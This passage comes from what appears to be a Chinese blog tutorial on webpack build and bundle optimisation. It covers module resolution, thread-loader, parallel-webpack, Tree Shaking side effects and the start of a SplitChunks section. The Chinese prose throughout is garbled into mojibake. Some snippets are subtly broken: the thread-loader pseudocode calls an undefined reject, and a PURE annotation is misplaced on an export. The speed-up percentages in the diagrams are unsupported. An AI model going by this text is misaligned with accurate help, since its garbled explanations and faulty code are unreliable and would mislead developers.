class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-attr">resolve</span>: &#123;<br>  <span class="hljs-attr">modules</span>: [<br>    <span class="hljs-comment">// æ˜ç¡®è·¯å¾„é¡ºåº</span><br>    <span class="hljs-string">&#x27;src/components&#x27;</span>,  <span class="hljs-comment">// 1. ç‰¹å®šç»„ä»¶ç›®å½•</span><br>    <span class="hljs-string">&#x27;src&#x27;</span>,             <span class="hljs-comment">// 2. é€šç”¨æºç›®å½•</span><br>    <span class="hljs-string">&#x27;shared&#x27;</span>,          <span class="hljs-comment">// 3. å…±äº«ç›®å½•</span><br>    <span class="hljs-string">&#x27;node_modules&#x27;</span>     <span class="hljs-comment">// 4. ç¬¬ä¸‰æ–¹åº“</span><br>  ],<br>  <span class="hljs-comment">// ä½¿ç”¨åˆ«åç²¾ç¡®æ§åˆ¶</span><br>  <span class="hljs-attr">alias</span>: &#123;<br>    <span class="hljs-string">&#x27;@components&#x27;</span>: path.<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">&#x27;src/components&#x27;</span>)<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>æ€§èƒ½ä¼˜åŒ–å†³ç­–ç­–ç•¥</strong></p><pre class="mermaid">graph TD  A[æ„å»ºé€Ÿåº¦æ…¢?] --> B{ç“¶é¢ˆç±»å‹}  B --> C[æ¨¡å—è§£ææ…¢] --> D[ä¼˜åŒ– resolve.modules]  B --> E[ä¾èµ–åˆ†ææ…¢] --> F[é…ç½® module.noParse]    D --> G[å‡å°‘æœç´¢è·¯å¾„æ•°é‡]  D --> H[è®¾ç½®ç²¾ç¡®è·¯å¾„é¡ºåº]  F --> I[è¯†åˆ«å¤§å‹ç‹¬ç«‹åº“]  F --> J[è·³è¿‡é¢„ç¼–è¯‘èµ„æº]    G --> K[å†·å¯åŠ¨åŠ é€Ÿ20-30%]  H --> L[çƒ­æ›´æ–°åŠ é€Ÿ15-25%]  I --> M[è§£ææ—¶é—´å‡å°‘40-60%]  J --> N[å†…å­˜å ç”¨é™ä½25-35%]</pre><h3 id="3-1-3-å¹¶è¡Œå¤„ç†ï¼šthread-loader-parallel-webpack"><a href="#3-1-3-å¹¶è¡Œå¤„ç†ï¼šthread-loader-parallel-webpack" class="headerlink" title="3.1.3 å¹¶è¡Œå¤„ç†ï¼šthread-loader &#x2F; parallel-webpack"></a>3.1.3 å¹¶è¡Œå¤„ç†ï¼š<code>thread-loader</code> &#x2F; <code>parallel-webpack</code></h3><p><strong>å¹¶è¡Œå¤„ç†æ ¸å¿ƒåŸç†</strong></p><p>CPUå¤šæ ¸åˆ©ç”¨æœºåˆ¶ï¼š</p><pre class="mermaid">graph LR  A[ä¸»è¿›ç¨‹] --> B[ä»»åŠ¡åˆ†é…å™¨]  B --> C[Worker 1]  B --> D[Worker 2]  B --> E[Worker 3]  C --> F[å¤„ç†ä»»åŠ¡A]  D --> G[å¤„ç†ä»»åŠ¡B]  E --> H[å¤„ç†ä»»åŠ¡C]  F --> I[ç»“æœåˆå¹¶]  G --> I  H --> I</pre><p><strong>thread-loader æ·±åº¦è§£æ</strong></p><p>å·¥ä½œåŸç†ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ä¼ªä»£ç å®ç°</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">source</span>) &#123;<br>  <span class="hljs-comment">// 1. åˆ›å»ºWorkerçº¿ç¨‹æ± </span><br>  <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">workerPool</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">workerPool</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WorkerPool</span>(&#123;<br>      <span class="hljs-attr">workers</span>: <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;os&#x27;</span>).<span class="hljs-title function_">cpus</span>().<span class="hljs-property">length</span> - <span class="hljs-number">1</span><br>    &#125;);<br>  &#125;<br>  <br>  <span class="hljs-comment">// 2. æäº¤ä»»åŠ¡åˆ°çº¿ç¨‹æ± </span><br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve</span>) =&gt;</span> &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">workerPool</span>.<span class="hljs-title function_">run</span>(&#123;<br>      <span class="hljs-attr">source</span>: source,<br>      <span class="hljs-attr">options</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getOptions</span>()<br>    &#125;, <span class="hljs-function">(<span class="hljs-params">err, result</span>) =&gt;</span> &#123;<br>      <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">return</span> <span class="hljs-title function_">reject</span>(err);<br>      <span class="hljs-title function_">resolve</span>(result);<br>    &#125;);<br>  &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><p>æœ€ä½³é…ç½®å®è·µï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// webpack.config.js</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">module</span>: &#123;<br>    <span class="hljs-attr">rules</span>: [<br>      &#123;<br>        <span class="hljs-attr">test</span>: <span class="hljs-regexp">/\.js$/</span>,<br>        <span class="hljs-attr">use</span>: [<br>          &#123;<br>            <span class="hljs-attr">loader</span>: <span class="hljs-string">&#x27;thread-loader&#x27;</span>,<br>            <span class="hljs-attr">options</span>: &#123;<br>              <span class="hljs-attr">workers</span>: <span class="hljs-number">4</span>,                   <span class="hljs-comment">// CPUæ ¸å¿ƒæ•°-1</span><br>              <span class="hljs-attr">workerParallelJobs</span>: <span class="hljs-number">50</span>,       <span class="hljs-comment">// æ¯ä¸ªWorkerå¹¶è¡Œä»»åŠ¡æ•°</span><br>              <span class="hljs-attr">poolTimeout</span>: <span class="hljs-number">2000</span>,            <span class="hljs-comment">// ç©ºé—²æ—¶è‡ªåŠ¨å…³é—­æ—¶é—´</span><br>              <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;js-pool&#x27;</span>               <span class="hljs-comment">// çº¿ç¨‹æ± åç§°</span><br>            &#125;<br>          &#125;,<br>          <span class="hljs-string">&#x27;babel-loader&#x27;</span><br>        ]<br>      &#125;,<br>      &#123;<br>        <span class="hljs-attr">test</span>: <span class="hljs-regexp">/\.css$/</span>,<br>        <span class="hljs-attr">use</span>: [<br>          <span class="hljs-string">&#x27;style-loader&#x27;</span>,<br>          &#123;<br>            <span class="hljs-attr">loader</span>: <span class="hljs-string">&#x27;thread-loader&#x27;</span>,<br>            <span class="hljs-attr">options</span>: &#123;<br>              <span class="hljs-attr">workers</span>: <span class="hljs-number">2</span>,                   <span class="hljs-comment">// CSSå¤„ç†é€šå¸¸è¾ƒè½»é‡</span><br>              <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;css-pool&#x27;</span><br>            &#125;<br>          &#125;,<br>          <span class="hljs-string">&#x27;css-loader&#x27;</span>,<br>          <span class="hljs-string">&#x27;postcss-loader&#x27;</span><br>        ]<br>      &#125;<br>    ]<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>parallel-webpack é«˜çº§åº”ç”¨</strong></p><p>(1) å¤šé…ç½®å¹¶è¡Œå¤„ç†</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// åˆ›å»ºwebpack.parallel.config.js</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = [<br>  &#123;<br>    <span class="hljs-attr">entry</span>: <span class="hljs-string">&#x27;./app.js&#x27;</span>,<br>    <span class="hljs-attr">output</span>: &#123; <span class="hljs-attr">filename</span>: <span class="hljs-string">&#x27;app-bundle.js&#x27;</span> &#125;<br>  &#125;,<br>  &#123;<br>    <span class="hljs-attr">entry</span>: <span class="hljs-string">&#x27;./admin.js&#x27;</span>,<br>    <span class="hljs-attr">output</span>: &#123; <span class="hljs-attr">filename</span>: <span class="hljs-string">&#x27;admin-bundle.js&#x27;</span> &#125;<br>  &#125;<br>];<br><br><span class="hljs-comment">// è¿è¡Œå‘½ä»¤</span><br>parallel-webpack --config=webpack.<span class="hljs-property">parallel</span>.<span class="hljs-property">config</span>.<span class="hljs-property">js</span><br></code></pre></td></tr></table></figure><p>(2) åŠ¨æ€é…ç½®ç”Ÿæˆ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ç”Ÿæˆå¤šé¡µé¢é…ç½®</span><br><span class="hljs-keyword">const</span> pages = [<span class="hljs-string">&#x27;home&#x27;</span>, <span class="hljs-string">&#x27;about&#x27;</span>, <span class="hljs-string">&#x27;contact&#x27;</span>];<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = pages.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">page</span> =&gt;</span> (&#123;<br>  <span class="hljs-attr">entry</span>: <span class="hljs-string">`./src/<span class="hljs-subst">$&#123;page&#125;</span>.js`</span>,<br>  <span class="hljs-attr">output</span>: &#123;<br>    <span class="hljs-attr">filename</span>: <span class="hljs-string">`<span class="hljs-subst">$&#123;page&#125;</span>.bundle.js`</span><br>  &#125;,<br>  <span class="hljs-attr">plugins</span>: [<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">HtmlWebpackPlugin</span>(&#123;<br>      <span class="hljs-attr">template</span>: <span class="hljs-string">`./src/<span class="hljs-subst">$&#123;page&#125;</span>.html`</span><br>    &#125;)<br>  ]<br>&#125;));<br></code></pre></td></tr></table></figure><p><strong>å†³ç­–æ ‘ï¼šé€‰æ‹©å¹¶è¡Œç­–ç•¥</strong></p><pre class="mermaid">graph TD  A[éœ€è¦å¹¶è¡Œå¤„ç†?] --> B{é¡¹ç›®ç±»å‹}  B --> C[å•å…¥å£SPA] --> D[ä½¿ç”¨thread-loader]  B --> E[å¤šå…¥å£/å¤šé¡µé¢] --> F[ä½¿ç”¨parallel-webpack]  B --> G[å¾®å‰ç«¯æ¶æ„] --> H[ç»„åˆä½¿ç”¨]    D --> I[CPUå¯†é›†å‹Loader]  F --> J[ç‹¬ç«‹é…ç½®æ„å»º]  H --> K[ä¸»åº”ç”¨thread-loader + å­åº”ç”¨parallel-webpack]    I --> L[æå‡50-70%æ„å»ºé€Ÿåº¦]  J --> M[æå‡60-80%æ„å»ºé€Ÿåº¦]  K --> N[æå‡70-90%æ„å»ºé€Ÿåº¦]</pre><h2 id="3-2-è¾“å‡ºåŒ…ä½“ç§¯ä¼˜åŒ–"><a href="#3-2-è¾“å‡ºåŒ…ä½“ç§¯ä¼˜åŒ–" class="headerlink" title="3.2 è¾“å‡ºåŒ…ä½“ç§¯ä¼˜åŒ–"></a>3.2 è¾“å‡ºåŒ…ä½“ç§¯ä¼˜åŒ–</h2><h3 id="3-2-1-Tree-Shakingå¤±æ•ˆåœºæ™¯åˆ†æï¼ˆå‰¯ä½œç”¨å¤„ç†ï¼‰"><a href="#3-2-1-Tree-Shakingå¤±æ•ˆåœºæ™¯åˆ†æï¼ˆå‰¯ä½œç”¨å¤„ç†ï¼‰" class="headerlink" title="3.2.1 Tree Shakingå¤±æ•ˆåœºæ™¯åˆ†æï¼ˆå‰¯ä½œç”¨å¤„ç†ï¼‰"></a>3.2.1 Tree Shakingå¤±æ•ˆåœºæ™¯åˆ†æï¼ˆå‰¯ä½œç”¨å¤„ç†ï¼‰</h3><p><strong>Tree Shaking æ ¸å¿ƒåŸç†</strong></p><p>å·¥ä½œåŸç†ç¤ºæ„å›¾ï¼š</p><pre class="mermaid">graph TD  A[æºä»£ç ] --> B[æ„å»ºä¾èµ–å›¾]  B --> C{æ ‡è®°æ´»åŠ¨ä»£ç }  C --> D[åˆ é™¤æœªä½¿ç”¨ä»£ç ]  D --> E[ä¼˜åŒ–åä»£ç ]    subgraph å…³é”®æ­¥éª¤    C1[ESMé™æ€åˆ†æ] --> C2[è¯†åˆ«å¯¼å‡ºå¯¼å…¥]    C3[å‰¯ä½œç”¨æ£€æµ‹] --> C4[å®‰å…¨åˆ é™¤]  end</pre><p><strong>Tree Shaking å¤±æ•ˆçš„å…­å¤§åœºæ™¯</strong></p><p>(1) å‰¯ä½œç”¨æ¨¡å—æœªå£°æ˜</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// åœºæ™¯ï¼šCSSå¯¼å…¥æ— å‰¯ä½œç”¨å£°æ˜</span><br><span class="hljs-keyword">import</span> <span class="hljs-string">&#x27;./styles.css&#x27;</span>; <span class="hljs-comment">// æ— æ˜¾å¼å¯¼å‡º</span><br><br><span class="hljs-comment">// è§£å†³æ–¹æ¡ˆï¼špackage.json</span><br>&#123;<br>  <span class="hljs-string">&quot;sideEffects&quot;</span>: [<span class="hljs-string">&quot;*.css&quot;</span>]<br>&#125;<br></code></pre></td></tr></table></figure><p>(2) CommonJS æ¨¡å—ä½¿ç”¨</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// åœºæ™¯ï¼šCommonJSæ— æ³•é™æ€åˆ†æ</span><br><span class="hljs-keyword">const</span> utils = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./utils&#x27;</span>); <span class="hljs-comment">// åŠ¨æ€å¯¼å…¥</span><br><span class="hljs-keyword">const</span> &#123; usedFunc &#125; = utils;<br><br><span class="hljs-comment">// è§£å†³æ–¹æ¡ˆï¼šè½¬ä¸ºESM</span><br><span class="hljs-keyword">import</span> &#123; usedFunc &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./utils&#x27;</span>;<br></code></pre></td></tr></table></figure><p>(3) åŠ¨æ€å¯¼å…¥æ¨¡å¼</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// åœºæ™¯ï¼šåŠ¨æ€å±æ€§è®¿é—®</span><br><span class="hljs-keyword">import</span> utils <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./utils&#x27;</span>;<br><span class="hljs-keyword">const</span> funcName = <span class="hljs-string">&#x27;usedFunc&#x27;</span>;<br>utils[funcName](); <span class="hljs-comment">// æ— æ³•é™æ€åˆ†æ</span><br><br><span class="hljs-comment">// è§£å†³æ–¹æ¡ˆï¼šç›´æ¥å¼•ç”¨</span><br><span class="hljs-keyword">import</span> &#123; usedFunc &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./utils&#x27;</span>;<br><span class="hljs-title function_">usedFunc</span>();<br></code></pre></td></tr></table></figure><p>(4) Babel è½¬æ¢ç ´å ESM</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// åœºæ™¯ï¼šBabelè½¬æ¢ESMä¸ºCommonJS</span><br><span class="hljs-comment">// .babelrc</span><br>&#123;<br>  <span class="hljs-string">&quot;presets&quot;</span>: [[<span class="hljs-string">&quot;@babel/preset-env&quot;</span>, &#123; <span class="hljs-string">&quot;modules&quot;</span>: <span class="hljs-string">&quot;commonjs&quot;</span> &#125;]] <span class="hljs-comment">// é”™è¯¯ï¼</span><br>&#125;<br><br><span class="hljs-comment">// è§£å†³æ–¹æ¡ˆï¼šä¿ç•™ESM</span><br>&#123;<br>  <span class="hljs-string">&quot;presets&quot;</span>: [[<span class="hljs-string">&quot;@babel/preset-env&quot;</span>, &#123; <span class="hljs-string">&quot;modules&quot;</span>: <span class="hljs-literal">false</span> &#125;]] <span class="hljs-comment">// æ­£ç¡®</span><br>&#125;<br></code></pre></td></tr></table></figure><p>(5) æ¨¡å—å†å¯¼å‡ºé—®é¢˜</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// åœºæ™¯ï¼šé€šé…ç¬¦å†å¯¼å‡º</span><br><span class="hljs-keyword">export</span> * <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./utils&#x27;</span>; <span class="hljs-comment">// æ— æ³•å•ç‹¬Tree Shake</span><br><br><span class="hljs-comment">// è§£å†³æ–¹æ¡ˆï¼šå‘½åå¯¼å‡º</span><br><span class="hljs-keyword">export</span> &#123; utilA, utilB &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./utils&#x27;</span>;<br></code></pre></td></tr></table></figure><p>(6) å¤–éƒ¨åŒ…æœªä¼˜åŒ–</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// åœºæ™¯ï¼šå…¨é‡å¯¼å…¥lodash</span><br><span class="hljs-keyword">import</span> _ <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;lodash&#x27;</span>; <span class="hljs-comment">// æ•´ä¸ªåŒ…è¢«å¼•å…¥</span><br>_.<span class="hljs-title function_">debounce</span>();<br><br><span class="hljs-comment">// è§£å†³æ–¹æ¡ˆï¼šæŒ‰éœ€å¯¼å…¥</span><br><span class="hljs-keyword">import</span> debounce <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;lodash/debounce&#x27;</span>;<br><span class="hljs-comment">// æˆ–ä½¿ç”¨ESç‰ˆæœ¬</span><br><span class="hljs-keyword">import</span> &#123; debounce &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;lodash-es&#x27;</span>;<br></code></pre></td></tr></table></figure><p><strong>å‰¯ä½œç”¨å¤„ç†æ·±åº¦è§£æ</strong></p><p>(1) sideEffects é…ç½®ç­–ç•¥</p><table><thead><tr><th align="left">é…ç½®æ–¹å¼</th><th align="left">æ•ˆæœ</th><th align="left">é€‚ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td align="left">false</td><td align="left">æ‰€æœ‰æ–‡ä»¶æ— å‰¯ä½œç”¨</td><td align="left">çº¯å·¥å…·åº“</td></tr><tr><td align="left">æ–‡ä»¶è·¯å¾„æ•°ç»„</td><td align="left">æ ‡è®°æœ‰å‰¯ä½œç”¨çš„æ–‡ä»¶</td><td align="left">å«CSS&#x2F;PNGçš„ç»„ä»¶åº“</td></tr><tr><td align="left">æ­£åˆ™è¡¨è¾¾å¼</td><td align="left">åŒ¹é…æœ‰å‰¯ä½œç”¨çš„æ–‡ä»¶</td><td align="left">æ‰¹é‡æ ‡è®°</td></tr></tbody></table><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JSON"><span class="hljs-comment">// å…¸å‹é…ç½®ç¤ºä¾‹</span><br><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;my-library&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;sideEffects&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>    <span class="hljs-string">&quot;**/*.css&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-string">&quot;**/*.scss&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-string">&quot;src/polyfill.js&quot;</span><br>  <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>(2) å‡½æ•°çº§å‰¯ä½œç”¨æ ‡è®°</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// æ˜ç¡®æ ‡è®°æ— å‰¯ä½œç”¨</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a, b</span>) &#123;<br>  <span class="hljs-keyword">return</span> a + b;<br>&#125;<br><br><span class="hljs-comment">/*#__PURE__*/</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> version = process.<span class="hljs-property">env</span>.<span class="hljs-property">VERSION</span>; <span class="hljs-comment">// æ ‡è®°ä¸ºçº¯</span><br><br><span class="hljs-comment">// æ ‡è®°å‰¯ä½œç”¨å‡½æ•°</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">window</span>.<span class="hljs-property">appConfig</span> = &#123;&#125;; <span class="hljs-comment">// æœ‰å‰¯ä½œç”¨</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Webpack ä¼˜åŒ–é…ç½®</strong></p><p>å®Œæ•´Tree Shakingé…ç½®ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">mode</span>: <span class="hljs-string">&#x27;production&#x27;</span>,<br>  <span class="hljs-attr">optimization</span>: &#123;<br>    <span class="hljs-attr">usedExports</span>: <span class="hljs-literal">true</span>,   <span class="hljs-comment">// å¯ç”¨å¯¼å‡ºæ ‡è®°</span><br>    <span class="hljs-attr">sideEffects</span>: <span class="hljs-literal">true</span>,   <span class="hljs-comment">// å¯ç”¨å‰¯ä½œç”¨åˆ†æ</span><br>    <span class="hljs-attr">minimize</span>: <span class="hljs-literal">true</span>,      <span class="hljs-comment">// å¯ç”¨ä»£ç å‹ç¼©</span><br>    <span class="hljs-attr">concatenateModules</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// ä½œç”¨åŸŸæå‡</span><br>    <span class="hljs-attr">innerGraph</span>: <span class="hljs-literal">true</span>     <span class="hljs-comment">// æ·±åº¦ä¾èµ–åˆ†æ(Webpack 5)</span><br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>å†³ç­–æ ‘ï¼šè§£å†³Tree Shakingå¤±æ•ˆ</strong></p><pre class="mermaid">graph TD  A[Tree Shakingå¤±æ•ˆ] --> B{å…·ä½“åœºæ™¯}  B --> C[æ¨¡å—æœ‰å‰¯ä½œç”¨] --> D[é…ç½®sideEffects]  B --> E[ä½¿ç”¨CommonJS] --> F[è½¬ä¸ºESM]  B --> G[åŠ¨æ€å¯¼å…¥] --> H[é‡æ„ä¸ºé™æ€å¼•ç”¨]  B --> I[Babelè½¬æ¢é—®é¢˜] --> J[è®¾ç½® modules: false]  B --> K[é€šé…ç¬¦å¯¼å‡º] --> L[ä½¿ç”¨å‘½åå¯¼å‡º]  B --> M[ç¬¬ä¸‰æ–¹åº“é—®é¢˜] --> N[ä½¿ç”¨ESç‰ˆæœ¬æˆ–æŒ‰éœ€å¯¼å…¥]</pre><h3 id="3-2-2-ä»£ç åˆ†å‰²ï¼šSplitChunksPluginé…ç½®ç­–ç•¥ï¼ˆchunks-minSize-cacheGroupsï¼‰"><a href="#3-2-2-ä»£ç åˆ†å‰²ï¼šSplitChunksPluginé…ç½®ç­–ç•¥ï¼ˆchunks-minSize-cacheGroupsï¼‰" class="headerlink" title="3.2.2 ä»£ç åˆ†å‰²ï¼šSplitChunksPluginé…ç½®ç­–ç•¥ï¼ˆchunks&#x2F;minSize&#x2F;cacheGroupsï¼‰"></a>3.2.2 ä»£ç åˆ†å‰²ï¼š<code>SplitChunksPlugin</code>é…ç½®ç­–ç•¥ï¼ˆ<code>chunks</code>&#x2F;<code>minSize</code>&#x2F;<code>cacheGroups</code>ï¼‰</h3><p><strong>åŸºç¡€é…ç½®é¡¹</strong></p><table><thead><tr><th align="left">é…ç½®é¡¹</th><th align="left">é»˜è®¤å€¼</th><th align="left">ä½œç”¨</th></tr></thead><tbody><tr><td align="left">chunks</td><td align="left">â€˜asyncâ€™</td><td align="left">æ§åˆ¶åˆ†å‰²èŒƒå›´ï¼šasync(åŠ¨æ€å¯¼å…¥) &#x2F; initial(åŒæ­¥å¯¼å…¥) &#x2F; all(å…¨éƒ¨)</td></tr><tr><td align="left">minSize</td><td align="left">20000 (20KB)</td><td align="left">ç”Ÿæˆæ–°chunkçš„æœ€å°ä½“ç§¯ï¼ˆè¿‡å°æ¨¡å—ä¸åˆ†å‰²ï¼‰</td></tr><tr><td align="left">minChunks</td><td align="left">1</td><td align="left">æ¨¡å—è¢«è‡³å°‘å¤šå°‘ä¸ªchunkå¼•ç”¨æ‰åˆ†å‰²</td></tr><tr><td align="left">maxAsyncRequests</td><td align="left">30</td><td align="left">æ¯ä¸ªå¼‚æ­¥åŠ è½½ä¸­æœ€å¤§å¹¶è¡Œè¯·æ±‚æ•°</td></tr><tr><td align="left">maxInitialRequests</td><td align="left">30</td><td align="left">å…¥å£ç‚¹æœ€å¤§å¹¶è¡Œè¯·æ±‚æ•°</td></tr></tbody></table><p><strong>æ ¸å¿ƒé…ç½® cacheGroupsï¼ˆé‡ç‚¹ï¼ï¼‰</strong></p><p>å®šä¹‰è‡ªå®šä¹‰åˆ†å‰²è§„åˆ™ç»„ï¼Œä¼˜å…ˆçº§é«˜äºå…¨å±€é…ç½®ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-attr">optimization</span>: &#123;<br>  <span class="hljs-attr">splitChunks</span>: &#123;<br>    <span 